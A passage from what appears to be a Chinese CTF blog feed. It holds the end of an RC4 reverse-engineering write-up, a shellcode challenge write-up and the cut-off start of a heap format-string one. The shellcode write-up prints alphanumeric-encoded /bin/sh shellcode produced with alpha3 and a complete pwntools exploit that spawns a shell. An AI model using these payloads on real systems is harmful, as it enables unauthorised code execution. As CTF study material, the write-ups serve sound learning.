class="params">(__int64 a1, __int64 input, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+20h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_40067A((<span class="keyword">const</span> <span class="keyword">char</span> *)a1, (__int64)&amp;v5);</span><br><span class="line">  sub_400753((__int64)&amp;v5, (<span class="keyword">const</span> <span class="keyword">char</span> *)input, v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>sub_40067A((const char *)a1, (__int64)&amp;v5);</code>所传入的参数可以知道，这是一个<strong>与我们输入的flag无关的函数</strong>。</p><p>具体分析了一下可以知道它的作用是根据main函数中的key去得到一个数组v5。</p><p>显然可以通过gdb调试(简便)或者自己写个算法(较麻烦,因为如果用python写，还要处理一些数据类型如unsigned int/unsigned __int8等的问题)得到这个数组v5。</p><p>得到的v5会传给<code>sub_400753((__int64)&amp;v5, (const char *)input, v3);</code>函数。</p><p>其作用是生成校验数组v3，也就是a3，也就是RC4的第三个参数RC4output，然后去与main函数中生成的数组进行对比校验，具体操作是通过<strong>一个数</strong>与我们的输入进行异或。</p><p><strong>分析一下，上一句中谈到的”一个数”，是与输入的flag无关的，即无论输入什么flag，只要满足flag.length == 45,在while循环中每次异或时循环次数相同时这个数都是固定不变的，那么可以将这些数(对应xor那句下断,它存在rdx中)提取出来作为一个数组，直接与main函数中的数组异或，便可得到flag。</strong></p><h1 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h1><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>由于<code>sub_40067A</code>生成v5数组的过程是与输入无关的,那么可以通过gdb调试或者算法等方法生成v5，然后模拟<code>sub_400753</code>的逆过程生成flag。</p><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>根据上面的分析，可以将<code>sub_400753</code>中与<code>input[i]</code>异或的那个数提取出来作为数组，与main函数的数组异或即可生成flag。</p><h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><p>后来才知道这个是RC4算法，有了密文(main数组即可转换为密文)和key(Nu1Lctf233)，即可生成明文flag。</p><p>不过网上各个RC4算法好像不太一致，在线网站生成结果也不太一样……</p><p>最终找到了一个能用的算法。</p><h1 id="0x03-解密脚本"><a href="#0x03-解密脚本" class="headerlink" title="0x03 解密脚本"></a>0x03 解密脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">根据IDA的显示结果,得到的L是这样的。</span></span><br><span class="line"><span class="string">L = [0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,</span></span><br><span class="line"><span class="string">     0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,</span></span><br><span class="line"><span class="string">     0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,</span></span><br><span class="line"><span class="string">     0x71,0x55,0x08,0x07,0xb2,0xa8,0x2f,0xf4,</span></span><br><span class="line"><span class="string">     0x51,0x8e,0x0c,0xcc,0x33,0x53,0x31,0x40,</span></span><br><span class="line"><span class="string">     0xd6,0xca,0xec,0xd4,0x00] #最后的0x00单纯是我为了凑够长度而补的...</span></span><br><span class="line"><span class="string">很可惜这不对,原因在于</span></span><br><span class="line"><span class="string">.text:00000000004009B1                 mov     [rbp+var_2D], 0CCh</span></span><br><span class="line"><span class="string">.text:00000000004009B5                 mov     [rbp+var_2C], 33h</span></span><br><span class="line"><span class="string">.text:00000000004009B9                 mov     [rbp+var_2B], 53h</span></span><br><span class="line"><span class="string">.text:00000000004009BD                 mov     [rbp+var_2A], 31h  #注意这里, 下一行直接是var_28,少了var_29</span></span><br><span class="line"><span class="string">.text:00000000004009C1                 mov     [rbp+var_28], 40h  #也即默认[rbp+var_29] = 0,并且以下都有一位移位</span></span><br><span class="line"><span class="string">.text:00000000004009C5                 mov     [rbp+var_27], 0D6h</span></span><br><span class="line"><span class="string">.text:00000000004009C9                 mov     [rbp+var_26], 0CAh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">通过gdb调试或者正确分析了以后可以知道真正的L是这样的</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">L = [<span class="number">0xc6</span>,<span class="number">0x21</span>,<span class="number">0xca</span>,<span class="number">0xbf</span>,<span class="number">0x51</span>,<span class="number">0x43</span>,<span class="number">0x37</span>,<span class="number">0x31</span>,</span><br><span class="line">     <span class="number">0x75</span>,<span class="number">0xe4</span>,<span class="number">0x8e</span>,<span class="number">0xc0</span>,<span class="number">0x54</span>,<span class="number">0x6f</span>,<span class="number">0x8f</span>,<span class="number">0xee</span>,</span><br><span class="line">     <span class="number">0xf8</span>,<span class="number">0x5a</span>,<span class="number">0xa2</span>,<span class="number">0xc1</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0x34</span>,<span class="number">0x6d</span>,</span><br><span class="line">     <span class="number">0x71</span>,<span class="number">0x55</span>,<span class="number">0x08</span>,<span class="number">0x07</span>,<span class="number">0xb2</span>,<span class="number">0xa8</span>,<span class="number">0x2f</span>,<span class="number">0xf4</span>,</span><br><span class="line">     <span class="number">0x51</span>,<span class="number">0x8e</span>,<span class="number">0x0c</span>,<span class="number">0xcc</span>,<span class="number">0x33</span>,<span class="number">0x53</span>,<span class="number">0x31</span>,<span class="number">0x00</span>,</span><br><span class="line">     <span class="number">0x40</span>,<span class="number">0xd6</span>,<span class="number">0xca</span>,<span class="number">0xec</span>,<span class="number">0xd4</span>,]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">思路1:似乎略微麻烦一些</span></span><br><span class="line"><span class="string">gdb调试拿到sub_40067A的结果的第二个参数,即下方s</span></span><br><span class="line"><span class="string">然后模拟执行sub_400753</span></span><br><span class="line"><span class="string">其中异或过程为逆向过程</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">s = <span class="string">'0x4e0xc40xf70x680x090x260x080x0e0x920x2d0x9a0x1a0x640xb00x210xa40x0b0x5d0xa20x220x4a0xd40x1b0x7e0xfb0x760x800x550x320x270x4f0x1d0xf80x8e0x880x0f0x5a0x690xe60xb40x2f0x9c0x8c0x890x360x110x380x8d0x250xe70xcd0x420x870xdf0x780x4c0x5f0x9f0x990xa30xcf0xa10xb20xd00x9b0x470x6a0xd10xbc0x5e0x850x130x590x1e0xc60x2c0x520xb60x4b0x650x2b0x400xaa0xeb0x960x750x410x490xf00x100x6d0xf40x810xde0x0c0xab0x0d0x5b0xc30xd20xe50x900xc00x660x290x010x940x440x480x200x570x980x610x830x8f0x150xae0x280xef0xa80x390xd70xc50x2a0xba0xec0x4d0x930x790xa90xfc0xe90xbb0xbd0xaf0x450xe80xdd0x0a0xdc0x040xc80xca0xe20xd50xb90x030x000xad0xa70x8a0x6c0x580xf50xee0x300xff0xbe0x7f0x190x560x540xc20xf30x720xbf0x630x170xfa0x9d0x770xd30x910x140x350x7d0x180xb70x230x8b0xa00xda0x050x7b0xe10x7a0xa60x620x710xcc0xd80x6b0x9e0xf60x3f0x1f0xb30x2e0x5c0x120x1c0x3a0x6f0x730xf10x670xcb0xac0x3e0x070x740xc10x860x510xc70x820xce0x430xe40xe30xed0x530x330x160xb50x060x370xdb0xc90xf20x840x500x950xa50xd60x460xb80xfd0x700x600x240x970x6e0xb10x3c0x020xea0x3b0x340xfe0xd90xf90x7c0xe00x3d0x31'</span></span><br><span class="line">Li = s.split(<span class="string">'\t'</span>)</span><br><span class="line">v5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Li:</span><br><span class="line">    v5.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这是模拟sub_400753,其中异或为逆向过程</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">45</span>):</span><br><span class="line">    v6 = ((((((v6+<span class="number">1</span>)&gt;&gt;<span class="number">31</span>)&amp;<span class="number">0xffffffff</span>)&gt;&gt;<span class="number">24</span>) + v6 + <span class="number">1</span>)&amp;<span class="number">0xff</span>) - ((((v6+<span class="number">1</span>)&gt;&gt;<span class="number">31</span>)&amp;<span class="number">0xffffffff</span>)&gt;&gt;<span class="number">24</span>)</span><br><span class="line">    v3 = (((v7+(v5[v6]&amp;<span class="number">0xff</span>))&gt;&gt;<span class="number">31</span>)&amp;<span class="number">0xffffffff</span>)&gt;&gt;<span class="number">24</span></span><br><span class="line">    v7 = (v3+v7 + v5[v6])&amp;<span class="number">0xff</span> - v3</span><br><span class="line">    v5[v6],v5[v7] = v5[v7],v5[v6]</span><br><span class="line">    tmp = v5[((v5[v6] + v5[v7])&amp;<span class="number">0xff</span>)]&amp;<span class="number">0xff</span></span><br><span class="line">    flag += chr(L[i]^tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">思路2:</span></span><br><span class="line"><span class="string">由于不论输入的flag是什么,只要满足输入长度=45,在sub_400753中input[i] ^ 某个数中这个某个数都是不变的</span></span><br><span class="line"><span class="string">固可以通过gdb调试，下断，依次读取其值(存在edx中),就能得到一个数组,然后去与我们的L进行异或</span></span><br><span class="line"><span class="string">即可得到flag</span></span><br><span class="line"><span class="string">得到的数组如下:</span></span><br><span class="line"><span class="string">这个方法算是思路1的进阶版吧,虽然也有点麻烦,但是对于应对一些算法比较晦涩难懂的情况还是很好用的</span></span><br><span class="line"><span class="string">(当然这个题算法....emmmm做完才知道是RC4....可以直接解密)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">ano = [<span class="number">0xa8</span>,<span class="number">0x10</span>,<span class="number">0xa8</span>,<span class="number">0xd0</span>,<span class="number">0x3e</span>,<span class="number">0x28</span>,<span class="number">0x4c</span>,<span class="number">0x44</span>,</span><br><span class="line">       <span class="number">0x06</span>,<span class="number">0xd5</span>,<span class="number">0xe0</span>,<span class="number">0x87</span>,<span class="number">0x0b</span>,<span class="number">0x09</span>,<span class="number">0xbc</span>,<span class="number">0x8f</span>,</span><br><span class="line">       <span class="number">0x8c</span>,<span class="number">0x2f</span>,<span class="number">0xd0</span>,<span class="number">0xf2</span>,<span class="number">0x98</span>,<span class="number">0xfa</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,</span><br><span class="line">       <span class="number">0x2e</span>,<span class="number">0x31</span>,<span class="number">0x6d</span>,<span class="number">0x30</span>,<span class="number">0xd7</span>,<span class="number">0xda</span>,<span class="number">0x42</span>,<span class="number">0xc5</span>,</span><br><span class="line">       <span class="number">0x3f</span>,<span class="number">0xbd</span>,<span class="number">0x53</span>,<span class="number">0xf8</span>,<span class="number">0x5f</span>,<span class="number">0x34</span>,<span class="number">0x01</span>,<span class="number">0x72</span>,</span><br><span class="line">       <span class="number">0x29</span>,<span class="number">0xe1</span>,<span class="number">0xa2</span>,<span class="number">0x81</span>,<span class="number">0xa9</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ano)):</span><br><span class="line">    flag += chr(ano[i]^L[i])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">思路3:</span></span><br><span class="line"><span class="string">直接利用RC4解密</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4 <span class="keyword">as</span> rc4cipher</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_algorithm</span><span class="params">(encrypt_or_decrypt, data, key1)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> encrypt_or_decrypt == <span class="string">"encrypt"</span>:</span><br><span class="line">        key = bytes(key1)</span><br><span class="line">        enc = rc4cipher.new(key)</span><br><span class="line">        res = enc.encrypt(data.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        res=base64.b64encode(res)</span><br><span class="line">        res = str(res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">elif</span> encrypt_or_decrypt == <span class="string">"decrypt"</span>:</span><br><span class="line">        data = base64.b64decode(data)</span><br><span class="line">        key = bytes(key1)</span><br><span class="line">        enc = rc4cipher.new(key)</span><br><span class="line">        res = enc.decrypt(data)</span><br><span class="line">        res = str(res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'Nu1Lctf233'</span></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    text += chr(i)</span><br><span class="line">res = base64.b64encode(text)</span><br><span class="line"><span class="keyword">print</span> rc4_algorithm(<span class="string">'decrypt'</span>, res, key)</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>细节很重要。</p><p>熟记各种常见算法会对逆向很有帮助。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://liul14n.top/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>mrctf2020_shellcode_revenge</title>
    <link href="http://liul14n.top/2020/09/23/mrctf2020-shellcode-revenge/"/>
    <id>http://liul14n.top/2020/09/23/mrctf2020-shellcode-revenge/</id>
    <published>2020-09-23T08:43:42.000Z</published>
    <updated>2020-09-23T09:05:53.490Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/61784497_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>刷到一道shellcode受限制的题目，自己尝试写shellcode，试了半天不行，最后查阅WP了解到有相关工具…..</p><p>特地记录一下</p><h1 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200923164859.png" alt></p><p>由于0x124D处的call指令导致F5反编译失败。</p><p>只能看汇编了。</p><p>根据汇编大概写出伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输出 <span class="string">"Show me your magic!"</span></span><br><span class="line">读取 <span class="number">0x400</span>个字节到buf,buf位于栈, rbp - <span class="number">0x410</span></span><br><span class="line">遍历buf[i]</span><br><span class="line"><span class="keyword">if</span>(buf[i]不属于<span class="number">0x30</span>~<span class="number">0x5a</span> 或者 <span class="number">0x61</span>~<span class="number">0x7a</span>)&#123;</span><br><span class="line">输出 <span class="string">"I Can't Read This!"</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">执行buf();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且NX保护没开，所以向buf写入符合要求的shellcode即可。</p><h1 id="0x02-Do-it"><a href="#0x02-Do-it" class="headerlink" title="0x02 Do it!"></a>0x02 Do it!</h1><p>查阅一番资料以后</p><p>找到一篇非常不错的文章，虽然没能让我解出这道题目，但是从中学到不少姿势。</p><p><a href="https://xz.aliyun.com/t/6645" target="_blank" rel="noopener">Shellcode的艺术</a></p><p>去尝试了使用<code>shellcode_encoder</code>生成符合要求的shellcode，结果生成的shellcode里面依然含有不在题目要求范围内的字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Jul <span class="number">21</span> <span class="number">2020</span>, <span class="number">15</span>:<span class="number">19</span>:<span class="number">50</span>) </span><br><span class="line">[GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">'shellcode_x64'</span>,<span class="string">'wb'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sc = asm(shellcraft.sh())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(sc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ python main.py shellcode_x64  rax</span><br><span class="line">Encoding stage2</span><br><span class="line">488b0432 =&gt; 4863343a31343a53582d692b6c722d21265870353e253f2f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">480faf44 =&gt; 4863343a31343a53582d394f4f642d515f2020353e5e3f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">32084889 =&gt; 4863343a31343a53582d576068292d482020203553773f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">043a83c7 =&gt; 4863343a31343a53582d515a23232d7c40204035375f3f5b505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">0883c610 =&gt; 4863343a31343a53582d692b46722d5c20205e3533375f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">85c075e8 =&gt; 4863343a31343a53582d202075492d21406020353a5f5f7e505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">Multiply-encoding stage3</span><br><span class="line">6a6848b82f62696e =&gt; 213339282e64403b 2a657a302621346e</span><br><span class="line">2f2f2f73504889e7 =&gt; 5f376c7274346e40 312a7d7e773c3f7d</span><br><span class="line">6872690101813424 =&gt; 58392e3534337d6e 6724682e6a376734</span><br><span class="line">0101010131f6566a =&gt; 775f695a3f256f51 47717c7b22375725</span><br><span class="line">085e4801e6564889 =&gt; 3738773f73217c4e 387e3f4442232a4d</span><br><span class="line">e631d26a3b580f05 =&gt; 413c7a24335b502e 6630522a7a37217c</span><br><span class="line">Assembling jump at +408</span><br><span class="line"></span><br><span class="line">Encoding preamble <span class="keyword">for</span> rdx &lt;- rax</span><br><span class="line">PZ</span><br><span class="line"></span><br><span class="line">Original length: 48</span><br><span class="line">Encoded length:  508</span><br><span class="line">Preamble length: 2</span><br><span class="line">Total length:    510</span><br><span class="line"></span><br><span class="line">PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&amp;Xp5&gt;%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5&gt;^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ<span class="comment">##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-"A`B-#`@~5#__?P_Hc4:14:SX- A $-3   5R|/+P^14:WX-_^/?-=apD-`@`|P_SX-@Ebi- \`Y5&lt;_==P^SX-_A1"-q@_~5(~o_P_AAAA!39(.d@;*ez0&amp;!4n_7lrt4n@1*&#125;~w&lt;?&#125;X9.543&#125;ng$h.j7g4w_iZ?%oQGq|&#123;"7W%78w?s!|N8~?DB#*MA&lt;z$3[P.f0R*z7!|</span></span><br></pre></td></tr></table></figure><p>最后了解到使用<code>alpha3</code>可以生成指定要求的shellcode，rax表示指向shellcode的寄存器(这道题是call rax，也就意味着rax是指向shellcode的)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">'shellcode_x64'</span> &gt; x64_out</span><br><span class="line"></span><br><span class="line">$ cat x64_out </span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><p>…然后send(shellcode)就行了…</p><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',25514)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c,'b * $rebase(0x124D)')</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'x64_out'</span>,<span class="string">'rb'</span>)</span><br><span class="line"></span><br><span class="line">sc = f.read()</span><br><span class="line">f.close()</span><br><span class="line">c.recvuntil(<span class="string">'magic!\n'</span>)</span><br><span class="line">c.send(sc)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/61784497_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>xman_2019_format(堆上格式化字符串)</title>
    <link href="http://liul14n.top/2020/09/18/xman-2019-format-%E5%A0%86%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>http://liul14n.top/2020/09/18/xman-2019-format-堆上格式化字符串/</id>
    <published>2020-09-18T08:54:26.000Z</published>
    <updated>2020-09-18T09:42:44.782Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/dva-overwatch-reading-book-ow.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>曾经也遇到过<code>堆上格式化字符串漏洞</code>类型的题目，但是咕了许久以后再次遇到这种类型的题目，捣鼓半天而且借助WP才搞出来……</p><p>特此写篇博客记录一下以加深印象。</p><p>题目在BUUCTF上可以找到.</p><h1 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>buf不在栈上，而是通过malloc申请的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>u);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x37</span>u);</span><br></pre></td></tr></table></figure><p>然后将buf作为参数，进入sub_80485C4函数内，该函数存在格式化字符串漏洞，不过只能单次利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 